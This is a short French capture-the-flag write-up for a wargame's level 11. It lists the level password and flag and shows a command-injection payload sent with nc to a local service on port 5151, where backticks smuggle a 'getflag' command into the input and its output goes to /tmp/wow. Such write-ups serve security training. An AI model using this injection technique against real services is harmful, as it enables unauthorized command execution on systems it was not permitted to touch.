# level 11

### ![#409EFF](https://via.placeholder.com/15/409EFF/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Password`
```
feulo4b72j7edeahuete3no7c
```

### ![#E6A23C](https://via.placeholder.com/15/E6A23C/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ ‎‏‏‎Exploit`

Y’a un code LUA, il fait croire qu’il faut dehash une string mais ça mène à rien.

À la place il faut faire un équivalent de SQL Injection.
```cmd
nc 127.0.0.1 5151

wow | echo `getflag` > /tmp/wow
```
On cat le résultat dans `/tmp/wow` -> `fa6v5ateaw21peobuub8ipe6s`


```cmd
su level12
```

### ![#67C23A](https://via.placeholder.com/15/67C23A/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Flag`
```
fa6v5ateaw21peobuub8ipe6s
```